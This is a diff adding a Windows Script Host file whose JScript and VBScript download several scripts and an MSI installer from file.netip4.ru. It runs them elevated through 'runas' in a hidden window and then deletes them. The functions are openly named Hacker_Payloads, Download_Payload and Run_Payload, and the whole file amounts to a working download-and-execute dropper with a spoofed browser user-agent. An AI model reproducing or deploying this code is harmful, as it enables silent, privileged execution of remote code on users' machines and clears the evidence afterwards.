@@ -1,0 +1,739 @@
+<?xml version="1.0" encoding="Windows-1251"?>
+<!-- ***************************** -->
+<!-- File wsf -->
+<!-- InitialCreate.wsf -->
+<!--
+This Script Downloads Batch File to
+Temporary Directory and Runs it with Elevated Privileges-->
+-->
+<!-- ***************************** -->
+<job id="ID1">
+	<script language="JScript">
+	<![CDATA[
+/*******************************************************
+ * MakeZlovred()
+ * Make Zlovred Directory
+ * This Script will Make Up a Zlovred Directory
+ *
+*******************************************************/
+function MakeZlovred(){
+
+	// Define a Variables
+	var fso, pub1_folder, pubdistrib_folder, pubzlovred_folder;
+	var error_string, succes_string;
+
+	error_string = "\nError! Can\'t Create the folder.\n";
+	succes_string = "\nSuccess Folder Create.\n";
+
+	// Create File System Object
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+
+	// Define Folders
+	pub1_folder = "C:\\pub1";
+	pubdistrib_folder = pub1_folder + "\\" + "Distrib";
+	pubzlovred_folder = pubdistrib_folder + "\\" + "Zlovred";
+
+	// Run a Payload
+	if( !fso.FolderExists(pub1_folder)) {
+		try {
+			fso.CreateFolder(pub1_folder);
+		} catch (err){
+			error_string +="Folder: " + pub1_folder + ", err: " + err.message +"\n";
+			WScript.Echo(error_string);
+			return 1;
+		}
+	}
+	if( !fso.FolderExists(pubdistrib_folder)) {
+		try {
+			fso.CreateFolder(pubdistrib_folder);
+		} catch (err){
+			error_string +="Folder: " + pubdistrib_folder + ", err: " + err.message +"\n";
+			WScript.Echo(error_string);
+			return 1;
+		}
+	}
+	if( !fso.FolderExists(pubzlovred_folder)) {
+		try {
+			fso.CreateFolder(pubzlovred_folder);
+		} catch (err){
+			error_string +="Folder: " + pubzlovred_folder + ", err: " + err.message +"\n";
+			WScript.Echo(error_string);
+			return 1;
+		}
+	}
+	WScript.Echo(succes_string);
+	return 0;
+}
+	]]>
+	</script>
+	<script language="JScript">
+	<![CDATA[
+
+/******************************************************************************
+'
+' RunDownloadedScript01( strPath, strVBS, intTimeOut )
+' This Function Run Hidden a strVBS File
+' with Command "cscript //NoLogo " & strPath & "\" & strVBS
+'
+' PARAMETERS:   strPath -- The Path to strVBS
+'               strVBS -- a VBS File with instructions
+'               (Windows Scripts Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedScript01(strPath, strVBS, intTimeOut) {
+	var constRun_VBS, constOpt;
+	// Define Windows Scripts Options
+	constRun_VBS = "//Nologo ";
+	// Define VBS Script Options (Empty)
+	constOpt = "";
+	var strValue, shApp, fso, wsh, envProc, pathCMD;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	// Check Paths
+	if(!fso.FileExists(pathCMD + "\\cscript.exe")) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strVBS)) {
+		return 1
+	};
+	// Set Cscript Command Arguments
+	strValue = constRun_VBS + "\"" + strPath + "\\" + strVBS + "\"" + constOpt;
+	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+	shApp.ShellExecute(pathCMD + "\\cscript.exe", strValue, strPath, "runas", 0);
+	//    setTimeout( DoNothing, intTimeOut );
+	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
+	WScript.Sleep(intTimeOut);
+	return 0;
+}
+
+/******************************************************************************
+'
+' RunDownloadedCMD01( strPath, strCMD, intTimeOut )
+' This Function Run Hidden a strCMD File
+' with Command "cmd /c " & strPath & "\" & strCMD
+'
+' PARAMETERS:   strPath -- The Path to strCMD
+'               strVBS -- a CMD File with instructions
+'               (Windows Command Shell)
+'				intTimeOut -- Estimated Time for Running (ms)
+'
+' RETURNS:      0 if Success
+'				1 if Path not Found
+'
+******************************************************************************/
+function RunDownloadedCMD01(strPath, strCMD, intTimeOut) {
+	var constRun_CMD, constOpt;
+	// Define Windows Scripts Options
+	constRun_CMD = "/c ";
+	var strValue, shApp, fso, wsh, envProc, pathCMD;
+	// Define ActiveX Object
+	shApp = new ActiveXObject("Shell.Application");
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	wsh = new ActiveXObject("WScript.Shell");
+	envProc = wsh.Environment("PROCESS");
+	pathCMD = envProc("SystemRoot") + "\\System32";
+	// Check Paths
+	if(!fso.FileExists(pathCMD + "\\cmd.exe")) {
+		return 1
+	};
+	if(!fso.FileExists(strPath + "\\" + strCMD)) {
+		return 1
+	};
+	// Set Cscript Command Arguments
+	strValue = constRun_CMD + "\"" + strPath + "\\" + strCMD + "\"";
+	// Run cscript.exe with Elevated Privileges (runas) at Invisible Mode (0), with working Diretory strPath
+	shApp.ShellExecute(pathCMD + "\\cmd.exe", strValue, strPath, "runas", 0);
+	//    setTimeout( DoNothing, intTimeOut );
+	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
+	WScript.Sleep(intTimeOut);
+	return 0;
+}
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+' *********************************************************
+' RegKeyRead001 Function
+' This Function Read the Key RegistryKey and Returns
+' a Key Value String
+' *********************************************************
+Function RegKeyRead001(registryKey)
+	' Returns the value of a windows registry key.
+	Dim winScriptShell
+	'WScript.Echo registryKey
+
+	On Error Resume Next
+	Set winScriptShell = CreateObject("WScript.Shell")  ' access Windows scripting
+	RegKeyRead001 = winScriptShell.RegRead(registryKey)    ' read key from registry
+End Function
+
+' *********************************************************
+' RegKeyRead002 Function
+' This Function Read the Key RegistryKey and Returns
+' a Key Value String
+' *********************************************************
+Function RegKeyRead002(RootKey, KeyName, ValueName, RegType)
+	' Returns the value of a windows registry key.
+	Dim oCtx, oLocator, oWMI, oReg, oInParams, oOutParams
+	Set oCtx = CreateObject("WbemScripting.SWbemNamedValueSet")
+	oCtx.Add "__ProviderArchitecture", RegType
+	Set oLocator = CreateObject("Wbemscripting.SWbemLocator")
+	Set oWMI = oLocator.ConnectServer("", "root\default", "", "", , , , oCtx)
+	Set oReg = oWMI.Get("StdRegProv")
+	Set oInParams = oReg.Methods_("GetStringValue").Inparameters
+	oInParams.Hdefkey = RootKey
+  	oInParams.Ssubkeyname = KeyName
+  	oInParams.Svaluename = ValueName
+
+	Set oOutParams = oReg.ExecMethod_("GetStringValue", oInParams, 0, oCtx)
+
+	RegKeyRead002 = oOutParams.SValue
+End Function
+
+' *********************************************************
+'
+' getTempEnviron01()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Zlovred Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+Function getTempEnviron01()
+	Dim fso, wsh, envProc, envSys
+	Dim strZlFolder ' Zlovred Temprorary Folder
+	' Define ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	' Define Process Environment Variable
+	Set envProc = wsh.Environment("PROCESS")
+	' Define System Environment Variable
+	Set envSys = wsh.Environment
+	' Define Zlovred Temprorary Folder
+	strZlFolder = "C:\pub1\Distrib\Zlovred"
+	' Define and Check Environment Variables
+	Dim envVariable
+	envVariable = strZlFolder
+	If Not fso.FolderExists(envVariable) Then
+		envVariable = envProc("TEMP")
+		If Not fso.FolderExists(envVariable) Then
+			envVariable = envSys("TMP")
+			IF Not fso.FolderExists(envVariable) Then
+				envVariable = ""
+			End If
+		End If
+	End If
+	getTempEnviron01 = envVariable
+End Function
+
+' *********************************************************
+'
+' getDownlEnviron01()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Download Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+Function getDownlEnviron01()
+	Dim fso, wsh, envProc, envSys, pathTemp
+	Dim strZlFolder ' Download Temprorary Folder
+	' Downloads Folder Registry Key
+	Dim GUID_WIN_DOWNLOADS_FOLDER
+	Dim KEY_PATH
+	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}"
+	KEY_PATH = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"
+	Dim aKey 
+	aKey = KEY_PATH & GUID_WIN_DOWNLOADS_FOLDER
+	'
+	' Define ActiveX Objects
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	Set wsh = CreateObject("WScript.Shell")
+	' Define Process Environment Variable
+	Set envProc = wsh.Environment("PROCESS")
+	' Define System Environment Variable
+	Set envSys = wsh.Environment
+	' Define Download Temprorary Folder
+
+	On Error Resume Next
+	pathTemp = RegKeyRead001(aKey)
+	On Error Goto 0
+
+	' WScript.Echo pathTemp
+	If InStr(1, pathTemp, "%USERPROFILE%", vbTextCompare ) Then 
+		pathTemp = Replace(pathTemp, "%USERPROFILE%", envProc("USERPROFILE"))
+	End If
+
+	' Define and Check Environment Variables
+	Dim envVariable
+	envVariable = pathTemp
+	If Not fso.FolderExists(envVariable) Then
+		envVariable = getTempEnviron01()
+		If Not fso.FolderExists(envVariable) Then
+				envVariable = ""
+		End If
+	End If
+	getDownlEnviron01 = envVariable
+End Function
+
+' *********************************************************
+'
+' UploadFilesFromIntWithHTTP01( strFile, strURL, strPath )
+' This Function Upload the File strFile from URL on HTTP/HTTPS Protocols
+' and Save it on Local Computer to Path strPath
+' Function Uses Objects "Microsoft.XMLHTTP" and "Adodb.Stream"
+'
+' PARAMETERS:   strFile -- a File to be Downloaded (only name and extension)
+'               strURL -- an URL of the web-site, from which the File
+'               is Downloaded
+'               strPath -- a Place in a Windows Computer (Full path without slash)
+'               in which the File is Downloaded
+'
+' RETURNS:      0 -- If File is Normally Downloaded and Created
+'               1 -- if File in Path strPath Can't Create
+'               2 -- if XMLHTTP or ADOStream Can't Initialize
+'				3 -- if Emty HTTP Responce or Send Access Denied
+'				4 -- if HTTP Response Not 200 (while is not make)
+'
+' *********************************************************/
+Function UploadFilesFromIntWithHTTP01(strFile, strURL, strPath)
+	' body...
+	On Error Resume Next
+	Err.Clear
+	Dim fso, xmlHttp, adoStream
+	Dim cb0, cb1, cb2, cb3
+	' Define FileSystemObject
+	Set fso = CreateObject("Scripting.FileSystemObject")
+	If Err.Number <> 0 Then
+		UploadFilesFromIntWithHTTP01 = 1
+	Else
+		Err.Clear
+		' Define XMLHTTP Help Object
+		' Set xmlHttp = getXmlHttp02
+		Set xmlHttp = CreateObject("Microsoft.XMLHTTP")
+		If IsNull(xmlHttp) Then
+			UploadFilesFromIntWithHTTP01 = 2
+		Else
+			' Define Adodb.Stream Object
+			Set adoStream = CreateObject("Adodb.Stream")
+			if Err.Number <> 0 Then
+				UploadFilesFromIntWithHTTP01 = 2
+			else
+				Err.Clear
+				Dim strFileURL
+				Dim strLocal_Path
+				Dim intUploadFilesFromIntWithHTTP01
+				Dim blnExistRemoteFile
+				Dim cb(4)
+				' Define Full Downloaded File URL
+				strFileURL = strURL & strFile
+				' Define Full Local Path to be Downloaded
+				strLocal_Path = strPath & "\" & strFile
+				intUploadFilesFromIntWithHTTP01 = 0
+				' Check if Path is Exist
+				if fso.FolderExists(strPath) Then
+					intUploadFilesFromIntWithHTTP01 = 0
+				else
+					intUploadFilesFromIntWithHTTP01 = 1
+				end if
+				If fso.FileExist(strLocal_Path) Then
+					fso.DeleteFile strLocal_Path, true
+				End If
+				' WScript.Echo "int = " & intUploadFilesFromIntWithHTTP01
+
+				' Downloaded File
+				' Open URL (Get Requiest synchronous)
+				Err.Clear
+				xmlHttp.Open "GET", strFileURL, false
+				If Err.Number <> 0 Then
+					WScript.Echo "Can't Open URL: " & strFileURL & vbNewLine & "Error: " & Str(Err.Number)
+					UploadFilesFromIntWithHTTP01 = 3
+				Else
+					Err.Clear
+					' Set User-Agent Header (for Safari Browser)
+					' WScript.Echo "Test!"
+					xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36"
+					' Define Function onreadystatechange
+					'xmlHttp.onreadystatechange = GetRef("xmlHTTP_OnReadyStateChange")
+					'if(xmlHttp.readyState === 4) {
+					'	cb[0] = xmlHttp.status; // Status of Request (Integer Number)
+					'	cb[1] = xmlHttp.getAllResponseHeaders(); // Response Header
+					'	cb[2] = xmlHttp.responseText; // Response Text
+					'	cb[3] = xmlHttp.responseBody; // Response Body
+					'}
+
+					' Send File from URL
+
+					xmlHttp.Send
+					' /*** Test ***/
+					' Wscript.Echo "Download-Status: " & xmlhttp.Status & " " & xmlhttp.statusText
+						'xmlHttp.WaitForResponse
+						'WScript.Echo "Can't make Send() Request!" & vbNewLine & "May be Block with Antivirus?" & vbNewLine & "Err = " & Str(Err.Number)
+						'UploadFilesFromIntWithHTTP01 = 3
+						'xmlHttp.Abort
+						Err.Clear
+						
+						cb0 = xmlHttp.Status
+						cb1 = xmlHttp.getAllResponseHeaders
+						cb2 = xmlHttp.responseText
+						cb3 = xmlHttp.responseBody
+						If cb0 = 200 And intUploadFilesFromIntWithHTTP01 = 0 Then
+							' WScript.Echo "XmlHttp Status = " & cb0 & vbNewLine
+							' If Send Request is Successful
+							blnExistRemoteFile = true
+						Else
+							blnExistRemoteFile = false
+							intUploadFilesFromIntWithHTTP01 = 4
+							WScript.Echo "Wrong HTTP Status:" & cb0 & vbNewLine & "nURL = " & strFileURL
+							xmlHttp.Abort
+						End If
+						If blnExistRemoteFile = true Then
+							' Set AdoStream Type mode and Open It
+							adoStream.Type = 1
+							adoStream.Mode = 3
+							adoStream.Open
+							' Write to AdoStream Response Body of HTTP Request
+							Err.Clear
+							adoStream.Write(cb3)
+							If Err.Number <> 0 Then
+								WScript.Echo "Can't Save Data to the Stream." & vbNewLine & "Error Status: " & Err.Number & vbNewLine
+							End If
+							' WScript.Echo "The Local File Path = " & strLocal_Path & vbNewLine
+							' Save Stream to strFile
+							Err.Clear ' Must be Heare!
+							adoStream.SaveToFile strLocal_Path, 2
+							If Err.Number <> 0 Then
+								WScript.Echo "Can't Save File Stream into File: " & strLocal_Path & vbNewLine & "Check Access Rights!" & vbNewLine &_ 
+									"Error Status: " & Err.Number & ". The Error " & Err.Description & " has occurred." & vbNewLine
+								intUploadFilesFromIntWithHTTP01 = 1
+							Else
+								' /Downloaded File
+								' Close Objects
+								adoStream.Close
+								xmlHttp.Abort
+								' Check If File Downloaded
+								If Not fso.FileExists(strLocal_Path) And intUploadFilesFromIntWithHTTP01 = 0 Then
+									Wscript.Echo strLocal_Path & " is not found!"
+									intUploadFilesFromIntWithHTTP01 = 1
+								End If
+							End If
+						End If
+				End If
+				UploadFilesFromIntWithHTTP01 = intUploadFilesFromIntWithHTTP01
+				' WScript.Echo strLocal_Path
+			end if
+		End If
+	End If
+End Function
+	]]>
+	</script>
+	<script language="JScript">
+	<![CDATA[
+/**********************************************************
+' * Function Download_Payload()
+' * This Function will Download TinyExclusions Files
+' * at a User's Downloads Directory
+' *
+' * PARAMETERS: downloadDir
+' * RETURNS:	0 if Success Downloads all Files
+' *				1 if Error Downloads Occur
+' ********************************************************/
+function Download_Payload( downloadDir ) {
+
+	// Define a Metadata Variables
+	var product_name, firm_name;
+
+	// Set a Metadata
+	product_name = "TinyExclusions";
+	firm_name = "NIT";
+	
+	// Define a Host Variables
+	var http_pref, http_domain, http_port, http_dir, host;
+	http_pref = "http";
+	http_domain = "file.netip4.ru";
+	http_port = "80";
+	http_dir = "/PROGS/" + firm_name + "/" + product_name + "/";
+	host = http_pref + "://" + http_domain + ":" + http_port + http_dir;
+
+	// Define Directories and Files Variables
+	var msiFile, makeDirFile, installCMDFile, msg_success;
+	makeDirFile = "NIT-MakeTemp.wsf";
+	installCMDFile = "install-TinyExclusions.MSI.01.cmd";
+	msiFile = "TinyExclusionsInstaller.msi";
+	msg_success = "Msg.TinyExclusions.Install.Success.wsf";
+
+	// Define Auxiliary Variables
+	var iRes, error_message, success_message, strFile;
+	error_message = "\nError! Canot Download a File.\n";
+	success_message = "\nSuccess File Download.\n";
+
+	// Run a Payload
+	strFile = makeDirFile;
+	iRes = UploadFilesFromIntWithHTTP01(strFile, host, downloadDir);
+	if( iRes > 0) {
+		error_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(error_message);
+		return 1;
+	}
+	else {
+		success_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(success_message);
+	}
+
+	strFile = installCMDFile;
+	iRes = UploadFilesFromIntWithHTTP01(strFile, host, downloadDir);
+	if( iRes > 0) {
+		error_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(error_message);
+		return 1;
+	}
+	else {
+		success_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(success_message);
+	}
+
+	strFile = msiFile;
+	iRes = UploadFilesFromIntWithHTTP01(strFile, host, downloadDir);
+	if( iRes > 0) {
+		error_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(error_message);
+		return 1;
+	}
+	else {
+		success_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(success_message);
+	}
+
+
+	strFile = msg_success;
+	iRes = UploadFilesFromIntWithHTTP01(strFile, host, downloadDir);
+	if( iRes > 0) {
+		error_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(error_message);
+	}
+	else {
+		success_message += "host = " + host + ", file = " + strFile +"\n";
+		WScript.Echo(success_message);
+	}
+
+	return 0;
+}
+
+/**********************************************************
+' * Function Run_Payload()
+' * This Function will Run TinyExclusions Files
+' * at a User's Downloads Directory
+' *
+' * PARAMETERS: downloadDir
+' * RETURNS:	0 if Success Run all Files
+' *				1 if Run Error Occur
+' ********************************************************/
+function Run_Payload( downloadDir ) {
+
+	// Define a Metadata Variables
+	var product_name, firm_name;
+
+	// Set a Metadata
+	product_name = "TinyExclusions";
+	firm_name = "NIT";
+	
+	// Define Directories and Files Variables
+	var msiFile, makeDirFile, installCMDFile, msg_success;
+	makeDirFile = "NIT-MakeTemp.wsf";
+	installCMDFile = "install-TinyExclusions.MSI.01.cmd";
+	msiFile = "TinyExclusionsInstaller.msi";
+	msg_success = "Msg.TinyExclusions.Install.Success.wsf";
+
+	// Set Time Out Intervals
+	var intTimeOut01, intTimeOut02;
+	intTimeOut01 = 3000; // 3 Seconds for Making Directories
+	intTimeOut02 = 180000; // 180 Seconds for TinyExclusionsInstaller Run
+
+	// Define Auxiliary Variables
+	var iRes, error_message, success_message, strFile;
+	error_message = "\nError! Cannot Find a File for Execution\n";
+	success_message = "\nSuccess! The Script is Execute.\n";
+
+	// Run a Payload
+
+	strFile = makeDirFile;
+	iRes = RunDownloadedScript01(downloadDir, strFile, intTimeOut01);
+	if( iRes > 0) {
+		error_message += "directory = " + downloadDir + ", file = " + strFile +"\n";
+		WScript.Echo(error_message);
+		return 1;
+	}
+	else {
+		success_message += "directory = " + downloadDir + ", file = " + strFile +"\n";
+		WScript.Echo(success_message);
+	}
+
+	strFile = installCMDFile;
+	Wscript.Echo("\nPress Ok and Please Wait Approximately 3 minutes...\n");
+	iRes = RunDownloadedCMD01(downloadDir, strFile, intTimeOut02);
+	if( iRes > 0) {
+		error_message += "directory = " + downloadDir + ", file = " + strFile +"\n";
+		WScript.Echo(error_message);
+		return 1;
+	}
+	else {
+		success_message += "directory = " + downloadDir + ", file = " + strFile +"\n";
+		WScript.Echo(success_message);
+	}
+	return 0;
+}
+
+/**********************************************************
+ * Delete_Payloads
+ * This Script will Delete Hacker's Payloads
+' *
+' * PARAMETERS: downloadDir
+' * RETURNS:	0 if Delete all Files
+' *				1 if Delete Error Occur
+**********************************************************/
+function Delete_Payloads(downloadDir) {
+
+	// Define a Metadata Variables
+	var product_name, firm_name;
+
+	// Set a Metadata
+	product_name = "TinyExclusions";
+	firm_name = "NIT";
+	
+	// Define Directories and Files Variables
+	var msiFile, makeDirFile, installCMDFile, msg_success;
+	makeDirFile = "NIT-MakeTemp.wsf";
+	installCMDFile = "install-TinyExclusions.MSI.01.cmd";
+	msiFile = "TinyExclusionsInstaller.msi";
+	msg_success = "Msg.TinyExclusions.Install.Success.wsf";
+
+	// Define Auxiliary Variables
+	var iRes, fso;
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+
+	// Run Payloads
+	strFile = makeDirFile;
+	strPath = downloadDir + "\\" + strFile;
+	if(fso.FileExists(strPath)) {
+		try {
+			fso.DeleteFile(strPath, true);
+		}
+		catch(err) {
+			WScript.Echo("\nError Deleting File: " + strPath + ".\nError = " + err.message + "\n");
+		}
+	}
+
+	strFile = installCMDFile;
+	strPath = downloadDir + "\\" + strFile;
+	if(fso.FileExists(strPath)) {
+		try {
+			fso.DeleteFile(strPath, true);
+		}
+		catch(err) {
+			WScript.Echo("\nError Deleting File: " + strPath + ".\nError = " + err.message + "\n");
+		}
+	}
+
+	strFile = msiFile;
+	strPath = downloadDir + "\\" + strFile;
+	if(fso.FileExists(strPath)) {
+		try {
+			fso.DeleteFile(strPath, true);
+		}
+		catch(err) {
+			WScript.Echo("\nError Deleting File: " + strPath + ".\nError = " + err.message + "\n");
+		}
+	}
+
+	strFile = msg_success;
+	strPath = downloadDir + "\\" + strFile;
+	if(fso.FileExists(strPath)) {
+		try {
+			fso.DeleteFile(strPath, true);
+		}
+		catch(err) {
+			WScript.Echo("\nError Deleting File: " + strPath + ".\nError = " + err.message + "\n");
+		}
+	}
+
+	WScript.Echo("\nAll Files had Tried to Delete!\n");
+	return 0;
+
+}
+
+/**********************************************************
+ * Hacker_Payloads
+ * This Script will Download and Execute Hacker's Payloads
+ *
+ * PARAMETERS:	NONE
+ * RETURNS:		0 if Succes Run Payloads
+ *				1 if Download Directory is not Found or Files Does Not Exist
+ *				2 if File Download Error
+**********************************************************/
+function Hacker_Payloads() {
+
+	// Define a Metadata Variables
+	var product_name, firm_name;
+
+	// Set a Metadata
+	product_name = "TinyExclusions";
+	firm_name = "NIT";
+	
+	// Define Directories and Files Variables
+	var downloadDir, fso;
+	fso = new ActiveXObject("Scripting.FileSystemObject");
+	downloadDir = getDownlEnviron01();
+	if( downloadDir.length == 0) {
+		Wscript.Echo("\nError! Download Directory is not Found!\n");
+		return 1;
+	}
+	
+	// Define Auxiliary Variables
+	var iRes;
+
+	// Run Payloads
+	iRes = Download_Payload(downloadDir);
+	if( iRes > 0 ) {
+		iRes = Delete_Payloads(downloadDir);
+		return 2;
+	}
+	iRes = Run_Payload(downloadDir);
+	if( iRes > 0) {
+		iRes = Delete_Payloads(downloadDir);
+		return 1;
+	}
+	iRes = Delete_Payloads(downloadDir);
+	return 0;
+}
+	]]>
+	</script>
+	<script language="VBScript">
+	<![CDATA[
+		Dim iRes
+		iRes = Hacker_Payloads()
+		if iRes = 2 Then
+			WScript.Echo vbNewLine & "Error at Downloading Files."
+		Elseif iRes = 1 Then
+			WScript.Echo vbNewLine & "Permission Denied at Creating Files or Folders."
+		Elseif iRes = 0 Then
+			WScript.Echo vbNewLine & "Succes Files Download and Run"
+		Else
+			WScript.Echo vbNewLine & "Unknown Error Occur"
+		End If
+	]]>
+	</script>
+</job>
